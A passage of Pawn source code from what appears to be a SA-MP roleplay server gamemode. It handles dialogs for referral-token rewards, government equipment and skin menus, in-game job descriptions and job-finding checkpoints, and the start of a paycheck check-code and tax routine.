			        PlayerInfo[playerid][pCrack] += 25;
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 1 referral token for 50 grams of pot and 25 grams of crack.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 1)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 1)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 1;

			        PlayerInfo[playerid][pMats] += 2500;
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 1 referral token for 2,500 materials.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 2)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 1)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 1;

			        PlayerInfo[playerid][pRespect] += 4;
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 1 referral token for 4 respect points.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 3)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 1)
			    {
			        if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_WHITE, "You can't get weapons when your weapons are still restricted.");
		         	PlayerInfo[playerid][pRefTokens] -= 1;

			        GivePlayerValidWeapon(playerid, 24, 60000);
			        GivePlayerValidWeapon(playerid, 27, 60000);
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 1 referral token for a SPAS-12 & Desert Eagle.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 4)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 2)
			    {
       				PlayerInfo[playerid][pRefTokens] -= 2;

			        PlayerInfo[playerid][pPot] += 100;
			        PlayerInfo[playerid][pCrack] += 50;
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 2 referral tokens for 100 grams of pot and 50 grams of crack.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 5)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 2)
			    {
			        if(PlayerInfo[playerid][pConnectTime] < 2) return SendClientMessage(playerid, COLOR_WHITE, "You can't get weapons when your weapons are still restricted.");
		         	PlayerInfo[playerid][pRefTokens] -= 2;

		        	GivePlayerValidWeapon(playerid, 27, 60000);
		        	GivePlayerValidWeapon(playerid, 24, 60000);
		        	GivePlayerValidWeapon(playerid, 31, 60000);
		        	GivePlayerValidWeapon(playerid, 34, 60000);
		        	GivePlayerValidWeapon(playerid, 29, 60000);
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 2 referral tokens for a full weapon set.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 6)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 2)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 2;

			        PlayerInfo[playerid][pRespect] += 8;
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 2 referral tokens for 8 respect points.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 7)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 2)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 2;

			        PlayerInfo[playerid][pMats] += 5000;
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 2 referral tokens for 5,000 materials.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 8)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 3)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 3;

			        PlayerInfo[playerid][pRespect] += 12;
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 3 referral tokens for 12 respect points.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 9)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 3)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 3;

			        PlayerInfo[playerid][pMats] += 10000;
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 3 referral tokens for 10,000 materials.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 10)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 4)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 4;

			        PlayerInfo[playerid][pRespect] += 16;
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 4 referral tokens for 16 respect points.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 11)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 4)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 4;

			        PlayerInfo[playerid][pMats] += 15000;
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 4 referral tokens for 15,000 materials.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 12)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 5)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 5;

			        PlayerInfo[playerid][pRespect] += 20;
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 5 referral tokens for 20 respect points.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 13)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 5)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 5;

			        PlayerInfo[playerid][pMats] += 20000;
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 5 referral tokens for 20,000 materials.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 14)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 10)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 10;

        			new nxtlevel = PlayerInfo[playerid][pLevel]+1;
					format(string, sizeof(string), "~g~LEVEL UP~n~~w~You're Now Level %d", nxtlevel);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					PlayerInfo[playerid][pLevel]++;
					PlayerInfo[playerid][gPupgrade] = PlayerInfo[playerid][gPupgrade]+2;
					GameTextForPlayer(playerid, string, 5000, 1);
					SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);

			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 10 referral tokens for a level up and 2 upgrade points (/upgrade).");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
			else if(listitem == 15)
			{
			    if(PlayerInfo[playerid][pRefTokens] >= 10)
			    {
			        PlayerInfo[playerid][pRefTokens] -= 10;

					new log[128];
					format(log, sizeof(log), "%s traded 10 referral tokens and is now waiting for a vehicle.", GetPlayerNameEx(playerid));
					Log("logs/referralcars.log", log);

					format(string, sizeof(string), "{AA3333}AdmWarning{FFFF00}: %s has just traded 10 referral tokens and is now waiting for a vehicle.", GetPlayerNameEx(playerid));
					ABroadCast(COLOR_YELLOW, string, 4);

                    format(PlayerInfo[playerid][pFlag], 128, "Free Car (Only ones available at dealerships)");

					SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: You have traded 10 referral tokens to receive a vehicle and have been automatically flagged to receive one.");
			        SendClientMessage(playerid, COLOR_YELLOW, "REFERRAL SYSTEM: This is a rare reward and may take up to 48 hours to be rewarded, contact a Level 4+ Admin.");
			    }
			    else return SendClientMessage(playerid, COLOR_WHITE, "You do not have enough referral tokens for that item.");
			}
		}
	}
	else if(dialogid == GOVLOCKERMENU) {
		// Uniform then Equipment

		if(!response)
		    return 1;

		switch(listitem) {
			case 0: ShowPlayerDialogEx(playerid, GOVSKINMENU, DIALOG_STYLE_LIST, "Government skin menu", "17 (black male in suit)\n57 (old asian male in suit)\n141 (young asian female suit)\n147 (middle aged white male)\n240 (young white male in vest)\n295 (toreno, older white male suit)", "OK", "Cancel");
			case 1: ShowPlayerDialogEx(playerid, GOVEQUIPMENU, DIALOG_STYLE_LIST, "Government equipment menu", "First Aid Kit\nArmour Vest\nDesert Eagle\nMP5\nShotgun\nM4\nAccessories", "OK", "Cancel");
			case 2: ShowPlayerDialogEx(playerid, FDUTYMENU4, DIALOG_STYLE_INPUT, "Undercover","Choose a skin (by ID).", "Select", "Cancel");
		}
	}
	else if(dialogid == GOVEQUIPMENU) {
		if(!response)
		    return 1;

		switch(listitem) {
			case 0: SetPlayerHealth(playerid, 100);
			case 1: SetPlayerArmourEx(playerid, 100);
			case 2: GivePlayerValidWeapon(playerid, 24, 99999);
			case 3: GivePlayerValidWeapon(playerid, 29, 99999);
			case 4: GivePlayerValidWeapon(playerid, 25, 99999);
			case 5: GivePlayerValidWeapon(playerid, 31, 99999);
			case 6: ShowPlayerDialogEx(playerid, BUYTOYSCOP, DIALOG_STYLE_MSGBOX, "Accessories", "Welcome to the law enforcement accessory locker!","Continue", "Cancel");
		}
	}
	else if(dialogid == GOVSKINMENU) {
		if(!response)
		    return 1;

		switch(listitem) {
			case 0: {
				SetPlayerSkin(playerid, 17);
				PlayerInfo[playerid][pSkin] = 17;
			}
			case 1:  {
				SetPlayerSkin(playerid, 57);
				PlayerInfo[playerid][pSkin] = 57;
			}
			case 2: {
				SetPlayerSkin(playerid, 141);
				PlayerInfo[playerid][pSkin] = 141;
			}
			case 3: {
				SetPlayerSkin(playerid, 147);
				PlayerInfo[playerid][pSkin] = 147;
			}
			case 4: {
				SetPlayerSkin(playerid, 240);
				PlayerInfo[playerid][pSkin] = 240;
			}
			case 5: {
				SetPlayerSkin(playerid, 295);
				PlayerInfo[playerid][pSkin] = 295;
			}
		}
	}
    else if(dialogid == JOBHELPMENU)
	{
 		if(response)
		{
			if(listitem == 0) //Detective
			{
				ShowPlayerDialogEx(playerid, DETECTIVEJOB, DIALOG_STYLE_MSGBOX, "Detective", "Information:\n\nThis job can be used to locate people anywhere around San Andreas.\nThis is helpful for the Government factions, and can be used to find criminals. It is a legal job and you can't get busted for doing it.\nIt will tell you the last known location(area) they were found in and give you a beacon.", "Next", "Cancel");
			}
			if(listitem == 1) // Lawyer
			{
				ShowPlayerDialogEx(playerid, LAWYERJOB, DIALOG_STYLE_MSGBOX, "Lawyer", "Information:\n\nThis job can be used to remove wanted stars, reduce jail time, and list all criminals.\nThis is helpful for criminals and crooks, it is a legal job and you can't get busted for doing it.\nIt will come in handy for your friends and families who got trouble with the cops.", "Next", "Cancel");
			}
			if(listitem == 2) //Whore
			{
				ShowPlayerDialogEx(playerid, WHOREJOB, DIALOG_STYLE_MSGBOX, "Whore", "Information:\n\nThis job can be used to bring pleasure to any clients who may be interested in having some fun.\nThis is a job that offers sex to every client who comes along.\nThis is an illegal job and you can get busted for doing it.", "Next", "Cancel");
			}
			if(listitem == 3) //Drug Dealer
            {
				ShowPlayerDialogEx(playerid, DRUGDEALERJOB, DIALOG_STYLE_MSGBOX, "Drug Dealer", "Information:\n\nThis job can be used to sell pot and crack to any customers you might find.\nIt often comes in handy, when you're a higher level at it.\nThe higher the level, the more drugs you can hold.\nThis is an illegal job and you can get busted for doing it.", "Next", "Cancel");
			}
			if(listitem == 4) //Mechanic
			{
				ShowPlayerDialogEx(playerid, MECHANICJOB, DIALOG_STYLE_MSGBOX, "Mechanic", "Information:\n\nThis job can be used to repair, add nos, and add hydraulics to vehicles.\nThis job can sometimes be rewarding, but often people do not require assistance.\nThis is a legal job and you can't get busted for doing it.", "Next", "Cancel");
			}
			if(listitem == 5) //Bodyguard
			{
				ShowPlayerDialogEx(playerid, BODYGUARDJOB, DIALOG_STYLE_MSGBOX, "Bodyguard", "Information:\n\nThis job can be used to give people half armor.\nThis job is very profitable and the common spot for purchasing off bodyguards is the gym.\nThis is a legal job and you can't get busted for doing it.", "Next", "Cancel");
			}
			if(listitem == 6) //Arms Dealer
			{
				ShowPlayerDialogEx(playerid, ARMSDEALERJOB, DIALOG_STYLE_MSGBOX, "Arms Dealer", "Information:\n\nThis job can be used to sell people weapons.\nThis job is very profitable and can earn you big cash at later levels.\nThis is an illegal job and you can get busted for doing it.", "Next", "Cancel");
			}
			if(listitem == 7) //Boxer
			{
				ShowPlayerDialogEx(playerid, BOXERJOB, DIALOG_STYLE_MSGBOX, "Boxer", "Information:\n\nThis job can be used to box people inside the Ganton Gym.\nThis job is not very money-making, but you can become the boxing champion.\nThis is a legal job and you can't get busted for doing it.", "Next", "Cancel");
			}
			if(listitem == 8) //Taxi Driver
            {
				ShowPlayerDialogEx(playerid, TAXIJOB, DIALOG_STYLE_MSGBOX, "Taxi Driver", "Information:\n\nThis job can be used to take passengers around the city for any price you desire($1 - $50 per 16 seconds).\nThis job is not very profitable as people do not usually call taxis, and sometimes they try to steal your taxi vehicle.\nThis is a legal job and you can't get busted for doing it.", "Next", "Cancel");
			}
			if(listitem == 9) //Drug Smuggling
            {
				ShowPlayerDialogEx(playerid, SMUGGLEJOB, DIALOG_STYLE_MSGBOX, "Drug Smuggling", "Information:\n\nThis job can be used to keep Crack and Pot filled in the Crack Lab.\nThis job is very profitable as people usually buy crack and pot, and sometimes they try to steal your pot and crack.\nThis is an illegal job and you can get busted for doing it.", "Next", "Cancel");
			}
			if(listitem == 10) //Craftsman
            {
				ShowPlayerDialogEx(playerid, CRAFTJOB, DIALOG_STYLE_MSGBOX, "Craftsman", "Information:\nThis job can be used to sell crafts to other players.\nThis job is very profitable as people have a need for many of the things you can make.\nThis is a legal job and you can't get busted for doing it.\n\nCommands:\n/getmats /craft\nLocation of job: This job can be obtained in Willowfield at the junkyard, at the job icon (yellow I).", "Done", "Cancel");
			}
			if(listitem == 11) //Bartender
            {
				ShowPlayerDialogEx(playerid, BARTENDERJOB, DIALOG_STYLE_MSGBOX, "Bartender", "Information:\nThis job can be used to sell drinks to other players.\nThis is a legal job and you can't get busted for doing it.\n\nCommands:\n/selldrink\nLocation of job: This job can be obtained inside the Alhambra Club, at the job icon (yellow I).", "Done", "Cancel");
			}
			if(listitem == 12) //Trucker
            {
				ShowPlayerDialogEx(playerid, TRUCKERJOB, DIALOG_STYLE_MSGBOX, "Trucker","Information:\nThis job can be used to earn money by making truck deliveries\nThis is a legal job, however you can get busted if you transport illegal goods or hijack trucks.\n\nCommands:\n/loadtruck /checktruck /hijacktruck\nLocation of job: This job can be obtained at Easter basin, at the job icon (yellow I).", "Done", "Cancel");
			}
			if(listitem == 13) //Pizza Boy
            {
				ShowPlayerDialogEx(playerid, PIZZAJOB, DIALOG_STYLE_MSGBOX, "Pizza Boy","Information:\nThis job can be used to earn money by grabbing a pizza from the\n Idlewood Pizza Stack and then delivering it to different houses.\n You will get less and less money as time moves on and eventually,\n when the pizza is cold, it will be worthless.\n\nCommands:\n/getpizza\nLocation of job: This job can be obtained at Pier 69, at the job icon (yellow I).", "Done", "Cancel");
			}
		}
	}
	else if(dialogid == SMUGGLEJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, SMUGGLEJOB3, DIALOG_STYLE_MSGBOX, "Drug Smuggling", "Commands:\n\n/getcrate [name(Pot/Crack)]\n\nLocation of job: This job can be obtained outside the Crack Lab, at the job icon (yellow I).", "Done", "Cancel");
		}
	}
	else if(dialogid == SMUGGLEJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, SMUGGLEJOB2, DIALOG_STYLE_MSGBOX, "Drug Smuggling", "Note: There is no reload time for drug smuggling and you do need to level it up to obtain more money. There are 5 levels for this job.", "Next", "Cancel");
		}
	}
	else if(dialogid == TAXIJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, TAXIJOB2, DIALOG_STYLE_MSGBOX, "Taxi Driver", "Note: There is no reload time for taxi fares and there are no levels for this job. In other words, you do not need to level it up to earn the max money you can.", "Next", "Cancel");
		}
	}
	else if(dialogid == TAXIJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, TAXIJOB3, DIALOG_STYLE_MSGBOX, "Taxi Driver", "Commands:\n\n/fare [$1 - $50]\n\nLocation of job: This job can be obtained in front of Unity Station at the job icon (yellow I).", "Done", "Cancel");
		}
	}
	if(dialogid == BOXERJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, BOXERJOB3, DIALOG_STYLE_MSGBOX, "Boxer", "Commands:\n\n/fight [PlayerID/Name], /boxstats\n\nLocation of job: This job can be obtained inside the Ganton Gym, at the job icon (yellow I).", "Done", "Cancel");
		}
	}
	else if(dialogid == BOXERJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, BOXERJOB2, DIALOG_STYLE_MSGBOX, "Boxer", "Note: There is no reload time for boxing and you don't need to level it up to box people in the gym. There are 3 levels for this job.\n\nLevel 1: Beginner Boxer.\nLevel 2: Amateur Boxer.\nLevel 3: Professional Boxer.", "Next", "Cancel");
		}
	}
	if(dialogid == ARMSDEALERJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, ARMSDEALERJOB2, DIALOG_STYLE_MSGBOX, "Arms Dealer", "Note: The reload time for selling guns is always 10 seconds, no matter what level.\n\nSkills:\n\nLevel 1 Weapons: Flowers, Knuckles, SDPistol, and Shotgun.\nLevel 2 Weapons: Baseball Bat, Cane, MP5, and Rifle.\nLevel 3 Weapons: Shovel and Deagle.\nLevel 4 Weapons: Poolcue, Golf Club, AK47, and M4.\nLevel 5 Weapons: Katana, Dildo, Sniper, and SPAS12.", "Next", "Cancel");
		}
	}
	else if(dialogid == ARMSDEALERJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, ARMSDEALERJOB3, DIALOG_STYLE_MSGBOX, "Arms Dealer", "Commands:\n\n/getmats, /sellgun\n\nLocation of job: This job can be obtained outside the large Ammunation, at the 'gun' icon.", "Done", "Cancel");
		}
	}
	else if(dialogid == BODYGUARDJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, BODYGUARDJOB3, DIALOG_STYLE_MSGBOX, "Bodyguard", "Commands:\n\n/guard [playerid/partofname] [Price $200 - $1000]\n\nLocation of job: This job can be obtained outside the Ganton Gym, at the job icon (yellow I).", "Done", "Cancel");
		}
	}
	if(dialogid == BODYGUARDJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, BODYGUARDJOB2, DIALOG_STYLE_MSGBOX, "Bodyguard", "Note: The reload time is always 10 seconds. There are no job levels for this job. In other words, you do not need to level it up to earn the max money you can.", "Next", "Cancel");
		}
	}
	else if(dialogid == MECHANICJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, MECHANICJOB2, DIALOG_STYLE_MSGBOX, "Mechanic", "Note: The reload time is always 1 minute, no matter what level.", "Next", "Cancel");
		}
	}
	else if(dialogid == MECHANICJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, MECHANICJOB3, DIALOG_STYLE_MSGBOX, "Mechanic", "Commands:\n\n/fix, /repair, /hyd, /nos, /mechduty\n\nLocation of job: This job can be obtained at Easter basin, at the job icon (yellow circle).", "Done", "Cancel");
		}
	}
	else if(dialogid == DRUGDEALERJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, DRUGDEALERJOB2, DIALOG_STYLE_MSGBOX, "Drug Dealer", "Note: The reload time is always 1 minute, no matter what level.\n\nSkills:\n\nLevel 1: You can hold 10 pot and 5 crack.\nLevel 2: You can hold 20 pot and 15 crack.\nLevel 3: You can hold 30 pot and 15 crack.\nLevel 4: You can hold 40 pot and 20 crack.\nLevel 5: You can hold 50 pot and 25 crack.", "Next", "Cancel");
		}
	}
	else if(dialogid == DRUGDEALERJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, DRUGDEALERJOB3, DIALOG_STYLE_MSGBOX, "Drug Dealer", "Commands:\n\n/sellpot, /getpot, /sellcrack, /getcrack\n\nLocation of job: This job can be located outside the Drug Den, opposite the Ganton Gym, at the 'D' icon.", "Done", "Cancel");
		}
	}
	else if(dialogid == WHOREJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, WHOREJOB3, DIALOG_STYLE_MSGBOX, "Whore", "Commands:\n\n/sex\n/sex is a command to offer sex to a client, and may only be used in a vehicle.\n\nLocation of job: This job can be obtained inside the Pig Pen, at the job icon (yellow circle).", "Done", "Cancel");
		}
	}
	else if(dialogid == LAWYERJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, LAWYERJOB3, DIALOG_STYLE_MSGBOX, "Lawyer", "Commands:\n\n/defend, /free, /wanted, /lawyerduty\n\nLocation of job: This job can be found at the job map icon (yellow I) near the bank.", "Done", "Cancel");
		}
	}
	else if(dialogid == WHOREJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, WHOREJOB2, DIALOG_STYLE_MSGBOX, "Whore", "Note: The reload time is always 1 minute, no matter what level.\n\nSkills:\n\nLevel 1: You have a very high chance of catching/giving STD's.\nLevel 2: You have a high chance of catching/giving STD's.\nLevel 3: You have a medium chance of catching/giving STD's.\nLevel 4: You have a low chance of catching/giving STD's.\nLevel 5: You have a very low chance of catching/giving STD's.", "Next", "Cancel");
		}
	}
	else if(dialogid == LAWYERJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, LAWYERJOB2, DIALOG_STYLE_MSGBOX, "Lawyer", "Note: The reload time will decrease as you level up.\n\nSkills:\n\nLevel 1: You can reduce inmates sentences by 1 minute.\nLevel 2: You can reduce inmates sentences by 2 minutes.\nLevel 3: You can reduce inmates sentences by 3 minutes.\nLevel 4: You can reduce inmates sentences by 4 minutes.\nLevel 5: You can reduce inmates sentences by 5 minutes.", "Next", "Cancel");
		}
	}
	else if(dialogid == DETECTIVEJOB2)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, DETECTIVEJOB3, DIALOG_STYLE_MSGBOX, "Detective", "Commands:\n\n/find\n/find is a command that can locate a player's position.\n\nLocation of job: This job can be obtained in the Los Santos Police Department.", "Done", "Cancel");
		}
	}
    else if(dialogid == DETECTIVEJOB)
	{
   		if(response)
		{
			ShowPlayerDialogEx(playerid, DETECTIVEJOB2, DIALOG_STYLE_MSGBOX, "Detective", "Skills:\n\nLevel 1: You can find someone for 4 seconds, the reload time is 2 minutes.\nLevel 2: You can find someone for 6 seconds, the reload time is 1 minute, 20 seconds.\nLevel 3: You can find someone for 8 seconds, the reload time is 1 minute.\nLevel 4: You can find someone for 10 seconds, the reload time is 30 seconds.\nLevel 5: You can find someone for 12 seconds, the reload time is 15 seconds.", "Next", "Cancel");
		}
	}
	else if(dialogid == FINDJOB)
	{
		if(response)
		{
			if(listitem == 0)
			{
   				FindingJob[playerid] = 1;
			    SetPlayerCheckpoint(playerid, 1555.170654, -1675.652343, 16.195312, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Detective Job. Go to the red checkpoint on your radar/map to get this job.");

			}
			if(listitem == 1)
			{
   				FindingJob[playerid] = 2;
			    SetPlayerCheckpoint(playerid, 1380.827148, -1088.673339, 27.384355, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Lawyer Job. Go to the red checkpoint on your radar/map to get this job.");
			}
			if(listitem == 2)
			{
   				FindingJob[playerid] = 3;
			    SetPlayerCheckpoint(playerid, 2421.525878, -1219.291503, 25.558557, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Whore Job. Go to the red checkpoint on your radar/map to get this job.");
			}
			if(listitem == 3)
			{
   				FindingJob[playerid] = 4;
			    SetPlayerCheckpoint(playerid, 2166.397216, -1675.312622, 15.085937, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Drug Dealer Job. Go to the red checkpoint on your radar/map to get this job.");
			}
			if(listitem == 4)
			{
   				FindingJob[playerid] = 5;
			    SetPlayerCheckpoint(playerid, 216.44, 18.47, 2.14, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Car Mechanic Job. Go to the red checkpoint on your radar/map to get this job.");
			}
			if(listitem == 5)
			{
   				FindingJob[playerid] = 6;
			    SetPlayerCheckpoint(playerid, 2226.128662, -1718.083984, 13.515367, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Bodyguard Job. Go to the red checkpoint on your radar/map to get this job.");
			}
			if(listitem == 6)
			{
   				FindingJob[playerid] = 7;
			    SetPlayerCheckpoint(playerid, 1366.455566, -1275.152709, 13.546875, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Arms Dealer Job. Go to the red checkpoint on your radar/map to get this job.");
			}
			if(listitem == 7)
			{
   				FindingJob[playerid] = 8;
			    SetPlayerCheckpoint(playerid, 2229.904052, -1721.263793, 13.561338, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Boxer Job. Go to the red checkpoint on your radar/map to get this job.");
			}
			if(listitem == 8)
			{
   				FindingJob[playerid] = 9;
			    SetPlayerCheckpoint(playerid, 2354.260498, -1169.261840, 28.004892, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Drug Smuggler Job. Go to the red checkpoint on your radar/map to get this job.");
			}
			if(listitem == 9)
			{
   				FindingJob[playerid] = 10;
			    SetPlayerCheckpoint(playerid, 1741.570678, -1863.780883, 13.574654, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Taxi Driver Job. Go to the red checkpoint on your radar/map to get this job.");
			}
			if(listitem == 10)
			{
   				FindingJob[playerid] = 11;
			    SetPlayerCheckpoint(playerid, 2195.686035, -1972.952880, 13.558935, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Craftsman Job. Go to the red checkpoint on your radar/map to get this job.");
			}
			if(listitem == 11)
			{
   				FindingJob[playerid] = 12;
			    SetPlayerCheckpoint(playerid, 1836.902587, -1682.565063, 13.328538, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Bartender Job. Go to the red checkpoint on your radar/map to get this job.");
			}
			if(listitem == 12)
			{
   				FindingJob[playerid] = 13;
			    SetPlayerCheckpoint(playerid, -1549.33, 112.50, 3.12, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Trucker Job. Go to the red checkpoint on your radar/map to get this job.");
			}
			if(listitem == 13)
			{
   				FindingJob[playerid] = 14;
			    SetPlayerCheckpoint(playerid, -1720.07, 1356.23, 6.75, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Pizza Boy Job. Go to the red checkpoint on your radar/map to get this job.");
			}
			if(listitem == 14)
			{
   				FindingJob[playerid] = 15;
			    SetPlayerCheckpoint(playerid, 383.403381, -2088.798339, 7.835937, 3);
			    SendClientMessage(playerid, COLOR_WHITE, "You have selected the Fisher Job. Go to the red checkpoint on your radar/map to fish.");
			}
		}
	}
    else if(dialogid == SIGNCHECK)
	{
 		if(!response) return 1;
		new
			szMessage[150];
   		if(strlen(inputtext) < 1)
		{
            format(szMessage, sizeof(szMessage), "You must enter the check code before signing.\n\nCheck code: %d\n\nEnter your check code to receive your paycheck:", PayCheckCode[playerid]);
			ShowPlayerDialogEx(playerid, SIGNCHECK, DIALOG_STYLE_INPUT, "Sign check", szMessage, "Sign check","Cancel");
			return 1;
        }
		if(!IsNumeric(inputtext))
		{
 			format(szMessage, sizeof(szMessage), "Wrong check code. The check code consists out of numbers only.\n\nCheck code: %d\n\nEnter your check code to receive your paycheck:", PayCheckCode[playerid]);
			ShowPlayerDialogEx(playerid, SIGNCHECK, DIALOG_STYLE_INPUT, "Sign check", szMessage, "Sign check","Cancel");
			return 1;
		}
        if(strlen(inputtext) > 6 || (strlen(inputtext) > 0 && strlen(inputtext) < 6))
		{
           	format(szMessage, sizeof(szMessage), "Wrong check code. The check code consists out of 6 digits.\n\nCheck code: %d\n\nEnter your check code to receive your paycheck:", PayCheckCode[playerid]);
			ShowPlayerDialogEx(playerid, SIGNCHECK, DIALOG_STYLE_INPUT, "Sign check", szMessage, "Sign check","Cancel");
			return 1;
        }

        new code = strval(inputtext);
        if(code == PayCheckCode[playerid])
		{
            PayCheckCode[playerid] = 0;

			// VIP Disabled
			/*if(PlayerInfo[i][pVip] > 0)
			{
    			PlayerInfo[i][pPayCheck] += PlayerInfo[i][pPayCheck] / 2;
			}*/

            new PayCheck = PlayerInfo[playerid][pPayCheck] / 10;


            new TaxCost;
            new TaxPercentage;
            if(PayCheck < 1250)
            {
				TaxPercentage = 10;
				TaxCost = (PayCheck / 100) * 10;
			}
			else if(PayCheck >= 1250 && PayCheck <= 1999)
			{
			    TaxPercentage = 15;
			    TaxCost = (PayCheck / 100) * 15;
			}
			else if(PayCheck >= 2000 && PayCheck <= 2499)
			{
			    TaxPercentage = 25;
			    TaxCost = (PayCheck / 100) * 25;
			}
			else if(PayCheck >= 2500 && PayCheck <= 3499)
			{
			    TaxPercentage = 30;
			    TaxCost = (PayCheck / 100) * 30;
			}
			else if(PayCheck >= 3500)
			{
			    TaxPercentage = 35;
			    TaxCost = (PayCheck / 100) * 35;
			}

            SendClientMessage(playerid, COLOR_WHITE, "________ BANK STATEMENT ________");
